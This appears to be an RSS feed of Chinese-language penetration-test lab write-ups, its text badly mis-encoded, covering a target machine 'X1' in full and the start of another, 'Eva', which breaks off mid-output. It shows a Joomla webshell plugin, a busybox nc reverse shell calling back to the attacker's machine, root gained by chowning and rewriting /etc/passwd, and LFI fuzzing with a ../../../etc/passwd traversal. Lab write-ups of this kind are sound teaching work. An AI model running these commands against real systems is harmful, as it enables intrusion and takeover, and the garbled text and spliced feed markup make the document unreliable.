‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo tcpdump -A -n icmp
# ... (‰∏ÄÁâáÂØÇÈùô) ...
```

ÊØõÁ∫øÊ≤°ÊúâÔºåÂïäÂïäÂïäÔºÅTCPÁöÑÂåÖ‰πüÁúã‰∫Ü‰∏ÄÂ†ÜÔºåÈô§‰∫ÜÊàëËá™Â∑±ÁöÑÊµÅÈáèÔºå‰πüÊ≤°Âï•ÁâπÂà´ÁöÑÔºàÁßÅ‰∫∫ÁöÑÂåÖÂ∞±‰∏çË¥¥‰∏äÊù•‰∫ÜÔºâ„ÄÇ

**ÊúÄÂêéÂ∏åÊúõÔºåUDPÊµÅÈáèÔºö**

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo tcpdump -A -n udp 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
09:57:33.971737 IP 192.168.205.207.48368 &gt; 255.255.255.255.5000: UDP, length 1
E.....@.@................       h.8.................
09:57:33.971797 IP 192.168.205.207.48368 &gt; 255.255.255.255.5000: UDP, length 1
E.....@.@................       h.8.................
# ... (ÊåÅÁª≠Âá∫Áé∞Á±ª‰ººÁöÑ UDP ÂåÖÔºåÁõÆÊ†áÁ´ØÂè£ 5000ÔºåÈïøÂ∫¶‰∏∫ 1) ...
09:58:02.059998 IP 192.168.205.207.39435 &gt; 255.255.255.255.5000: UDP, length 1
E...+t@.@................       Q.r.................
# ... (Êï∞ÊçÆÂÜÖÂÆπÂú®ÂèòÂåñÔºå‰ΩÜÈÉΩÊòØÂçï‰∏™Â≠óÁ¨¶) ...
```

ÊàëÂéªÔºÅÂú®ËøôÂÑøÁ≠âÁùÄÊàëÂë¢ÔºÅÁõÆÊ†á‰∏ªÊú∫ `192.168.205.207` Âú®ÂæÄÂπøÊí≠Âú∞ÂùÄ `255.255.255.255` ÁöÑ UDP 5000 Á´ØÂè£ÂèëÂåÖÔºåÊØèÊ¨°‰∏Ä‰∏™Â≠óÁ¨¶„ÄÇ
Ëøô‰∏çÂ∞±ÂØπ‰∏ä‰∫ÜÂêóÔºüÈ¶ñÈ°µÈÇ£‰∏™ 'shark'ÔºàÈ≤®È±ºÔºâ... **Wireshark**ÔºÅËçâÔºåÂéüÊù•ÊòØËøô‰∏™ÊÑèÊÄùÔºÅ

Ëµ∂Á¥ßÊääËøô‰∫õÂ≠óÁ¨¶ÊèêÂèñÂá∫Êù•„ÄÇ‰∏Ä‰∏™‰∏™Â§çÂà∂Á≤òË¥¥Â§™Ë†¢‰∫ÜÔºå‰∏çÁêÜËß£‰ΩÜÂ∞äÈáçÊÉ≥ÈÇ£‰πàÂπ≤ÁöÑÂãáÂ£´„ÄÇ
‰ªîÁªÜËßÇÂØüÂèëÁé∞ÔºåÂÆÉÊòØÂú®UDP 5000Á´ØÂè£‰∏ãÂèëÈÄÅÊï∞ÊçÆ„ÄÇÁî® `nc` ËØïËØïÔºö

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nc -lu -p 5000
r^C 
```

Á≠â‰∫Ü‰∏Ä‰ºöÂÑøÔºå`nc` Âè™ËÉΩÊé•Êî∂‰∏Ä‰∏™Â≠óÁ¨¶ÔºåËÄå‰∏îÊé•Êî∂ÂÆåÂ∞±Êñ≠‰∫Ü„ÄÇËøô‰∏çË°åÂïäÔºåÂæóÊÉ≥‰∏™ÂäûÊ≥ïÊåÅÁª≠Êé•Êî∂„ÄÇÊàëÂéªÈóÆ‰∫ÜGPTÔºåÂÆÉÁªô‰∫Ü‰∏™Áî® `ncat` ÁöÑÊñπÊ≥ïÔºö

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ ncat -luk -p 5000
8182602383ce1root:00dae9e3052fb2255408182602383ce1^C
```

Êàê‰∫ÜÔºÅÊçïËé∑Âà∞‰∏Ä‰∏≤Â≠óÁ¨¶Ôºö`root:00dae9e3052fb2255408182602383ce1`

### ‰∫å„ÄÅËé∑ÂèñÂàùÂßãËÆøÈóÆÊùÉÈôê

ÊåâÁÖßÊàëÂØπÁæ§‰∏ªÁöÑÁêÜËß£ÔºåÂ∞±ÁÆóÈù∂Êú∫Ê†áÁöÑ‚ÄúÊØîËæÉÁÆÄÂçï‚ÄùÔºå‰πü‰∏ç‰ºöÁõ¥Êé•Â∞±ÈÄÅ‰∏™ root ÂØÜÁ†Å„ÄÇËøô‰∏≤ `root:00dae9e3052fb2255408182602383ce1` ÁúãÁùÄÂ∞±ÂÉèÁî®Êà∑ÂêçÂíåÂØÜÁ†ÅÔºàÊàñËÄÖÂØÜÁ†ÅÂìàÂ∏åÔºâÔºåËøôÂ∫îËØ•ÊòØ Joomla ÂêéÂè∞ `/administrator/` ÁöÑÁôªÂΩïÂá≠ÊçÆ„ÄÇ

#### 1. ÁôªÂΩïJoomlaÂêéÂè∞

Áî®Áî®Êà∑Âêç `root` ÂíåÂØÜÁ†Å `00dae9e3052fb2255408182602383ce1` Â∞ùËØïÁôªÂΩï `http://192.168.205.207/administrator/`„ÄÇ

ÊàêÂäüÁôªÂΩïÔºÅÊàëËøò‰ª•‰∏∫Ë¶ÅËß£‰∏™HashÂë¢„ÄÇ

#### 2. ‰∏ä‰º†WebshellÊèí‰ª∂

Ëøõ‰∫ÜÂêéÂè∞ÔºåËøôÁßçCMSÊúÄÂ∏∏ËßÅÁöÑGetShellÊñπÂºèÂ∞±ÊòØÈÄöËøáÊèí‰ª∂‰∏ä‰º†Webshell„ÄÇ

![image-20250511222523465](https://7r1umphk.github.io/image/20250511222523819.webp)Âú®GitHub‰∏äÊêú‰∫Ü‰∏Ä‰∏ã 'Joomla webshell plugin'ÔºåÂæàÂø´ÊâæÂà∞‰∫Ü‰∏Ä‰∏™Áé∞ÊàêÁöÑÔºö
`https://github.com/p0dalirius/Joomla-webshell-plugin`

![image-20250511222613763](https://7r1umphk.github.io/image/20250511222613917.webp)

Ê†πÊçÆÈ°πÁõÆËØ¥ÊòéÔºåÂú®ÂÆÉÁöÑ `dist` ÁõÆÂΩïÈáå‰∏ãËΩΩ‰∏Ä‰∏™ÊâìÂåÖÂ•ΩÁöÑ `mod_webshell.zip` Â∞±Ë°å„ÄÇ

ÂõûÂà∞JoomlaÂêéÂè∞Ôºå'System' -&gt; 'Install' -&gt; 'Extensions'Ôºå‰∏ä‰º†Âπ∂ÂÆâË£Ö `mod_webshell.zip`„ÄÇ
ÂÆâË£ÖÊàêÂäüÂêéÔºåÊ†πÊçÆÊèí‰ª∂ÁöÑËØ¥ÊòéÊñáÊ°£ÔºåÂèØ‰ª•ÈÄöËøáËÆøÈóÆÁâπÂÆöË∑ØÂæÑÊù•ÊâßË°åÂëΩ‰ª§„ÄÇ

![image-20250511222957053](https://7r1umphk.github.io/image/20250511222957204.webp)

ÊµãËØï‰∏Ä‰∏ãÂëΩ‰ª§ÊâßË°åÔºö

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ curl -X POST 'http://192.168.205.207/modules/mod_webshell/mod_webshell.php' --data 'action=exec&amp;cmd=id'
{'stdout':'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n','stderr':'','exec':'id'}
```

ÂëΩ‰ª§ÊàêÂäüÊâßË°åÔºåÂΩìÂâçÁî®Êà∑ÊòØ `www-data`„ÄÇ

### ‰∏â„ÄÅÂèçÂºπShell‰∏éÊèêÊùÉ

#### 1. Ëé∑ÂèñÂèçÂºπShell

ÂÖàÂú®Kali‰∏äÁõëÂê¨Á´ØÂè£Ôºö

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nc -lvnp 8888    
listening on [any] 8888 ...
```

ÁÑ∂ÂêéÈÄöËøáWebshellÊâßË°åÂèçÂºπÂëΩ‰ª§Ôºö

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ curl -X POST 'http://192.168.205.207/modules/mod_webshell/mod_webshell.php' --data 'action=exec&amp;cmd=nc 192.168.205.206 8888 -e /bin/bash'
{'stdout':'','stderr':'sh: 1: nc: not found\n','exec':'nc 192.168.205.206 8888 -e \/bin\/bash'}
```

ÁõÆÊ†áÊú∫‰∏äÊ≤°Êúâ `nc`„ÄÇËØïËØï `busybox nc`Ôºö

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]                                                                                                                                                     
‚îî‚îÄ$ curl -X POST 'http://192.168.205.207/modules/mod_webshell/mod_webshell.php' --data 'action=exec&amp;cmd=busybox nc 192.168.205.206 8888 -e /bin/sh'
```

ËøôÊ¨°ÊàêÂäü‰∫ÜÔºÅKaliÁöÑÁõëÂê¨Âô®Êî∂Âà∞‰∫ÜËøûÊé•Ôºö

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]                                                                                                                                                                
‚îî‚îÄ$ nc -lvnp 8888                                                                                                                                                                  
listening on [any] 8888 ...                                                                                                                                                        
connect to [192.168.205.206] from (UNKNOWN) [192.168.205.207] 39696
```

#### 2. Á®≥ÂÆöShell

ÂæóÂà∞ÁöÑÂàùÂßãShell‰∏çÂ§™Â•ΩÁî®ÔºåÈúÄË¶ÅÁ®≥ÂÆö‰∏Ä‰∏ãÔºö

```bash
# Âú®ÂèçÂºπÂõûÊù•ÁöÑshellÈáåÊâßË°å
script /dev/null -c bash
# Êåâ Ctrl+Z ÊîæÂà∞ÂêéÂè∞
# Âú®KaliÁªàÁ´ØÊâßË°å
stty raw -echo; fg
# ÂõûËΩ¶ÔºåÁÑ∂ÂêéÁªßÁª≠Âú®ÂèçÂºπshellÈáåÊâßË°å
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80 # Ê†πÊçÆËá™Â∑±ÁªàÁ´ØË∞ÉÊï¥
```

OKÔºåÁé∞Âú®Êúâ‰∏™ÂÉèÊ†∑ÁöÑShell‰∫Ü„ÄÇ

#### 3. ÊùÉÈôêÊèêÂçá (`www-data` -&gt; `root`)

ÂΩìÂâçÁî®Êà∑ `www-data`Ôºö

```
www-data@X1:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Âà∞Â§ÑÁøªÁøªÁúãÔºåÂÖàÁúãÁúã `/home` Âíå `/var/www` ÁõÆÂΩïÔºö

```shell
www-data@X1:/$ cd /home/
www-data@X1:/home$ ls -al
total 12
drwxr-xr-x  3 root    root    4096 Apr 11 22:27 .
drwxr-xr-x 19 root    root    4096 May 10 03:38 ..
drwx------  2 welcome welcome 4096 May 10 03:44 welcome
www-data@X1:/home$ cd /var/www/html
www-data@X1:/var/www/html$ ls -al 
# ... (Joomla Êñá‰ª∂ÂàóË°®) ...
www-data@X1:/var/www/html$ cat web.config.txt 
&lt;?xml version='1.0' encoding='UTF-8'?&gt;
&lt;configuration&gt;
   &lt;location path='.'&gt;
   &lt;system.webServer&gt;
       &lt;directoryBrowse enabled='false' /&gt;
       &lt;rewrite&gt;
           &lt;rules&gt;
               &lt;rule name='Joomla! Common Exploits Prevention' stopProcessing='true'&gt;
                   &lt;match url='^(.*)$' ignoreCase='false' /&gt;
                   &lt;conditions logicalGrouping='MatchAny'&gt;
                       &lt;add input='{QUERY_STRING}' pattern='base64_encode[^(]*\([^)]*\)' ignoreCase='false' /&gt;
                       &lt;add input='{QUERY_STRING}' pattern='(&amp;gt;|%3C)([^s]*s)+cript.*(&amp;lt;|%3E)' /&gt;
                       &lt;add input='{QUERY_STRING}' pattern='GLOBALS(=|\[|\%[0-9A-Z]{0,2})' ignoreCase='false' /&gt;
                       &lt;add input='{QUERY_STRING}' pattern='_REQUEST(=|\[|\%[0-9A-Z]{0,2})' ignoreCase='false' /&gt;
                   &lt;/conditions&gt;
                   &lt;action type='CustomResponse' url='index.php' statusCode='403' statusReason='Forbidden' statusDescription='Forbidden' /&gt;
               &lt;/rule&gt;
               &lt;rule name='Joomla! API Application SEF URLs'&gt;
                   &lt;match url='^api/(.*)' ignoreCase='false' /&gt;
                   &lt;conditions logicalGrouping='MatchAll'&gt;
                     &lt;add input='{URL}' pattern='^/api/index.php' ignoreCase='true' negate='true' /&gt;
                     &lt;add input='{REQUEST_FILENAME}' matchType='IsFile' ignoreCase='false' negate='true' /&gt;
                     &lt;add input='{REQUEST_FILENAME}' matchType='IsDirectory' ignoreCase='false' negate='true' /&gt;
                   &lt;/conditions&gt;
                   &lt;action type='Rewrite' url='api/index.php' /&gt;
               &lt;/rule&gt;
               &lt;rule name='Joomla! Public Frontend SEF URLs'&gt;
                   &lt;match url='(.*)' ignoreCase='false' /&gt;
                   &lt;conditions logicalGrouping='MatchAll'&gt;
                     &lt;add input='{URL}' pattern='^/index.php' ignoreCase='true' negate='true' /&gt;
                     &lt;add input='{REQUEST_FILENAME}' matchType='IsFile' ignoreCase='false' negate='true' /&gt;
                     &lt;add input='{REQUEST_FILENAME}' matchType='IsDirectory' ignoreCase='false' negate='true' /&gt;
                   &lt;/conditions&gt;
                   &lt;action type='Rewrite' url='index.php' /&gt;
               &lt;/rule&gt;
           &lt;/rules&gt;
       &lt;/rewrite&gt;
       &lt;httpProtocol&gt;
           &lt;customHeaders&gt;
               &lt;add name='X-Content-Type-Options' value='nosniff' /&gt;
               &lt;!-- Protect against certain cross-origin requests. More information can be found here: --&gt;
               &lt;!-- https://developer.mozilla.org/en-US/docs/Web/HTTP/Cross-Origin_Resource_Policy_(CORP) --&gt;
               &lt;!-- https://web.dev/why-coop-coep/ --&gt;
               &lt;!-- &lt;add name='Cross-Origin-Resource-Policy' value='same-origin' /&gt; --&gt;
               &lt;!-- &lt;add name='Cross-Origin-Embedder-Policy' value='require-corp' /&gt; --&gt;
           &lt;/customHeaders&gt;
       &lt;/httpProtocol&gt;
   &lt;/system.webServer&gt;
   &lt;/location&gt;
&lt;/configuration&gt;
```

ÂØªÊâæSUIDÊñá‰ª∂ËøõË°åÊèêÊùÉÔºö

```shell
www-data@X1:/var/www/html$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chown  &lt;-- ËÄÅÊúãÂèã‰∫ÜÔºÅ
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

ÂèëÁé∞‰∫Ü `/usr/bin/chown` Ëøô‰∏™ËÄÅÊúãÂèãÔºåÂπ∂‰∏îÊúâSUIDÊùÉÈôê„ÄÇ
Êü•ÈòÖ GTFOBins ([https://gtfobins.github.io/gtfobins/chown/#suid](https://gtfobins.github.io/gtfobins/chown/#suid))Ôºö

![image-20250511223840468](https://7r1umphk.github.io/image/20250511223840670.webp)

ÊÄùË∑ØÂ∞±ÊòØÁî® `chown` Êää `/etc/passwd` ÁöÑÊâÄÊúâÊùÉÊîπÊàê `www-data`ÔºåÁÑ∂ÂêéÊàë‰ª¨Â∞±ÂèØ‰ª•ÁºñËæëÂÆÉÔºåÁªôrootÁî®Êà∑Êîπ‰∏™ÂØÜÁ†ÅÔºàÊàñËÄÖÁõ¥Êé•Ê∑ªÂä†‰∏Ä‰∏™Â∏¶rootÊùÉÈôêÁöÑÊñ∞Áî®Êà∑Ôºâ„ÄÇ

**ÁîüÊàêÂØÜÁ†ÅÂìàÂ∏åÔºö**
Âú®Kali‰∏äÁî® `openssl` ÁîüÊàê‰∏Ä‰∏™ÂØÜÁ†Å `888888` ÁöÑÂìàÂ∏åÔºö

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ openssl passwd 888888   
$1$FRnIm4sd$wXAhXRwWvKAL1viFFq.9A1
```

**ÂºÄÂßãÊìç‰ΩúÔºö**
Âú® `www-data` ÁöÑShellÈáåÔºö

1. Êõ¥Êîπ `/etc/passwd` ÁöÑÊâÄÊúâÊùÉÔºö

   ```shell
   www-data@X1:/var/www/html/administrator$ chown www-data:www-data /etc/passwd
   ```

2. ÁºñËæë `/etc/passwd` (Â¶ÇÊûúÁõÆÊ†áÊú∫‰∏äÊúâ `nano` Êàñ `vi` Â∞±Êñπ‰æøÂ§ö‰∫ÜÔºåÊ≤°ÊúâÁöÑËØùÂ∞±ÂæóÊÉ≥ÂäûÊ≥ïÊääÂÜÖÂÆπÂºÑÂá∫Êù•Êîπ‰∫ÜÂÜçË¶ÜÁõñÂõûÂéª)Ôºö

   ```shell
   www-data@X1:/var/www/html/administrator$ nano /etc/passwd
   ```

   ÊâæÂà∞ `root` Áî®Êà∑ÈÇ£‰∏ÄË°åÔºåÈÄöÂ∏∏ÊòØ `root:x:0:0:root:/root:/bin/bash`ÔºåÊää `x` ÊõøÊç¢ÊàêÊàë‰ª¨ÁîüÊàêÁöÑÂìàÂ∏å `$1$FRnIm4sd$wXAhXRwWvKAL1viFFq.9A1`„ÄÇ
   ‰øÆÊîπÂêéÂèòÊàêÔºö`root:$1$FRnIm4sd$wXAhXRwWvKAL1viFFq.9A1:0:0:root:/root:/bin/bash`

   ![image-20250511224840653](https://7r1umphk.github.io/image/20250511224840863.webp)
   ‰øùÂ≠òÈÄÄÂá∫„ÄÇ

3. ÂàáÊç¢Âà∞ `root` Áî®Êà∑Ôºö

   ```shell
   www-data@X1:/var/www/html/administrator$ su -
   Password:  # ËæìÂÖ• 888888
   root@X1:~# id
   uid=0(root) gid=0(root) groups=0(root)
   ```

   ÊàêÂäüÊãøÂà∞ root ÊùÉÈôêÔºÅ

#### 4. ËØªÂèñÊúÄÁªàÁöÑ Flag

```shell
root@X1:~# cat /root/root.txt
flag{root-72c0cd908b77fd5a4d0c988f7e002431}    
```

ÊêûÂÆöÔºÅ

### Âõõ„ÄÅÊÄªÁªì

Ëøô‰∏™ X1 Èù∂Êú∫ÔºåÂâçÊúü‰ø°ÊÅØÊî∂ÈõÜÈò∂ÊÆµÈÇ£‰∏™ UDP 80 Á´ØÂè£ÁöÑ'È≤®È±º'ÊèêÁ§∫Á°ÆÂÆûÊúâÁÇπÊÑèÊÄùÔºåÊ≤°Ê≥®ÊÑèÂà∞ÁöÑËØù‰º∞ËÆ°ÂæóÂç°‰∏Ä‰ºöÂÑøÔºàÊàëÂ∞±ÊòØÈÇ£‰∏™ÂÜ§ÁßçÔºâ„ÄÇÊãøÂà∞ Joomla ÂêéÂè∞Âá≠ÊçÆÂêéÔºå‰∏ä‰º†Êèí‰ª∂ getshell Â±û‰∫éÂ∏∏ËßÑÊìç‰Ωú„ÄÇÊúÄÂêéÁöÑ `chown` SUID ÊèêÊùÉ‰πüÊòØÊØîËæÉÁªèÂÖ∏ÁöÑÂà©Áî®ÊñπÂºè„ÄÇÊï¥‰ΩìÊù•ËØ¥ÔºåÁ°ÆÂÆûÊòØ‚ÄúÊØîËæÉÁÆÄÂçï‚ÄùÔºå‰ΩÜËøáÁ®ãËøòÊòØÊå∫ÊúâË∂£ÁöÑ„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/ba-ji-%20X1%20-shen-tou-ce-shi-bao-gao.html</guid><pubDate>Fri, 27 Jun 2025 09:29:41 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Eva</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Eva.html</link><description>![image-20250608102554020](https://7r1umphk.github.io/image/20250608102601444.webp)

ÊâìÂù§ÊâìÂù§

Êé¢Êµãip

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ sudo arp-scan -l                                      
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.
192.168.205.130 08:00:27:9c:35:56       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:ed:18:9e       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.044 seconds (125.24 hosts/sec). 4 responded
                       
```

Èù∂Êú∫ip 192.168.205.130ÔºåÊé¢ÊµãÊúçÂä°

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ nmap -p- 192.168.205.130            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 22:27 EDT
Nmap scan report for 192.168.205.130
Host is up (0.00022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:9C:35:56 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.21 seconds
                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ nmap -p22,80 -sC -sV 192.168.205.130
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 22:28 EDT
Nmap scan report for 192.168.205.130
Host is up (0.00034s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: \xE2\x9D\x80 \xE9\xBE\x8D \xC2\xB7 \xE8\xA6\xBA\xE9\x86\x92 \xE2\x9D\x80
MAC Address: 08:00:27:9C:35:56 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.13 seconds

```

Â∏∏ËßÑÔºåÁúãweb

![1](https://7r1umphk.github.io/image/20250608102947610.webp)

‰∏Ä‰∏™ÂÖ≥‰∫é„ÄäÈæôÊóè„ÄãÁöÑÈ°µÈù¢
ÊâíÊãâ‰∫Ü‰∏Ä‰∏ãÊ∫ê‰ª£Á†ÅÔºåÊ≤°Êúâ‰ªÄ‰πà

ÁõÆÂΩïÁàÜÁ†¥

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ dirsearch -u http://192.168.205.130/                                
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /mnt/hgfs/gx/reports/http_192.168.205.130/__25-06-07_22-30-53.txt

Target: http://192.168.205.130/

[22:30:53] Starting: 
[22:30:54] 403 -  280B  - /.ht_wsr.txt
[22:30:54] 403 -  280B  - /.htaccess.bak1
[22:30:54] 403 -  280B  - /.htaccess.orig
[22:30:54] 403 -  280B  - /.htaccess.sample
[22:30:54] 403 -  280B  - /.htaccess.save
[22:30:54] 403 -  280B  - /.htaccess_extra
[22:30:54] 403 -  280B  - /.htaccess_sc
[22:30:54] 403 -  280B  - /.htaccess_orig
[22:30:54] 403 -  280B  - /.htaccessBAK
[22:30:54] 403 -  280B  - /.htaccessOLD
[22:30:54] 403 -  280B  - /.htaccessOLD2
[22:30:54] 403 -  280B  - /.htm
[22:30:54] 403 -  280B  - /.html
[22:30:54] 403 -  280B  - /.htpasswd_test
[22:30:54] 403 -  280B  - /.htpasswds
[22:30:54] 403 -  280B  - /.httr-oauth
[22:30:54] 403 -  280B  - /.php
[22:31:14] 403 -  280B  - /server-status
[22:31:14] 403 -  280B  - /server-status/

Task Completed
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.130/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.130/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 12224]
/dragon.php           (Status: 200) [Size: 10284]
Progress: 76819 / 1102800 (6.97%)
```

Êé¢ÊµãÂà∞‰∏Ä‰∏™/dragon.phpÔºåÂÖàÁúãÁúã
![image-20250608103236313](https://7r1umphk.github.io/image/20250608103236778.webp)

ÊúâÂõõ‰∏™Ë®ÄÁÅµÔºåÊâíÊãâ‰∏Ä‰∏ãÊ∫ê‰ª£Á†Å
Ê∫ê‰ª£Á†ÅÈáçÁÇπ

```
&lt;div class='incantation-name' data-name='divinedecree'&gt;
                DivineDecree
                &lt;div class='tooltip'&gt;
                    &lt;div class='tooltip-title'&gt;DIVINE DECREE&lt;/div&gt;
                    &lt;div class='tooltip-desc'&gt;
                        The holy light that illuminates all truth. This ability allows access to all knowledge and secrets.&lt;br&gt;&lt;br&gt;
                        ‚ö†Ô∏è WARNING: DivineDecree can reveal and read ALL content without restrictions. Handle with extreme care!
                    &lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
```

'‚ö†Ô∏è Ë≠¶ÂëäÔºöDivineDecree ÂèØ‰ª•‰∏çÂèóÈôêÂà∂Âú∞ÊòæÁ§∫ÂíåÈòÖËØªÊâÄÊúâÂÜÖÂÆπ„ÄÇËØ∑Ê†ºÂ§ñÂ∞èÂøÉÔºÅ'

ÊèêÁ§∫Êàë‰ª¨ÊòØ‰∏Ä‰∏™LFIÔºåÁÑ∂ÂêéÂÆÉÊåâÈíÆÁ°ÆÂÆûÊòØÂèëÂåÖ‰∫Ü

```
&lt;form method='post'&gt;
            &lt;input 
                type='text' 
                name='incantation' 
                id='incantation-input'
                class='incantation-input' 
                placeholder='Enter Incantation...' 
                autocomplete='off'
            &gt;
```

ÊâÄ‰ª•Â§ßÊ¶ÇÊãºÊé•‰∏Ä‰∏ãincantation=DivineDecree

burpÊäì‰∏Ä‰∏ã

```
POST /dragon.php HTTP/1.1
Host: 192.168.205.130
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://192.168.205.130
Connection: keep-alive
Referer: http://192.168.205.130/dragon.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

incantation=divinedecree
```

ÂèëÂåÖÊ≤°Êúâ‰ªª‰ΩïÂèòÂåñÔºå‰ΩÜÊòØÂÆÉÈÉΩÊèêÈÜíÊòØLFI‰∫ÜÊâÄ‰ª•FUZZ‰∏Ä‰∏ã

‰∏§‰∏™ÊñπÊ°à

‰Ω†ÂèØ‰ª•Êãøburp intruder fuzz

ÊàñËÄÖÊãøwfuzz fuzzÔºåÊàëÊºîÁ§∫wfuzz

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://192.168.205.130/dragon.php?FUZZ=../../../etc/passwd' -X POST -d 'incantation=divinedecree' --hh 10213
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.130/dragon.php?FUZZ=../../../etc/passwd
Total requests: 220559

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                           
=====================================================================

000000759:   200        347 L    917 W      11711 Ch    'file'                                                                                                            
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 1097
Filtered Requests: 1096
Requests/sec.: 0
```

curl‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ wget http://192.168.205.130/dragon.php                                                                              
--2025-06-07 22:42:08--  http://192.168.205.130/dragon.php
Connecting to 192.168.205.130:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‚Äòdragon.php‚Äô

dragon.php                                       [ &lt;=&gt;                                                                                          ]  10.04K  --.-KB/s    in 0s      

